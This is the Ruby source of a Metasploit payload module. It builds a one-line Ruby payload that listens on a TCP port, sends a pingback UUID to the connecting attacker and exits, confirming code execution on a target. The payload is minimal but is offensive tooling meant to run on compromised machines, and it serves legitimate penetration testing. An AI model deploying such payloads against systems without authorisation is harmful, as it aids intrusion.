module MetasploitModule
  CachedSize = 110

  include Msf::Payload::Single
  include Msf::Payload::Ruby
  include Msf::Payload::Pingback
  include Msf::Payload::Pingback::Options

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Ruby Pingback, Bind TCP',
        'Description' => 'Listens for a connection from the attacker, sends a UUID, then terminates',
        'Author' => 'asoto-r7',
        'License' => MSF_LICENSE,
        'Platform' => 'ruby',
        'Arch' => ARCH_RUBY,
        'Handler' => Msf::Handler::BindTcp,
        'Session' => Msf::Sessions::Pingback,
        'PayloadType' => 'ruby'
      )
    )
  end

  def generate(_opts = {})
    # return prepends(ruby_string)
    return ruby_string
  end

  def ruby_string
    self.pingback_uuid ||= generate_pingback_uuid
    return "require'socket';" \
      "s=TCPServer.new(#{datastore['LPORT'].to_i});"\
      'c=s.accept;'\
      's.close;'\
      "c.puts'#{[[self.pingback_uuid].pack('H*')].pack('m0')}\'.unpack('m0');" \
      'c.close'
  end
end
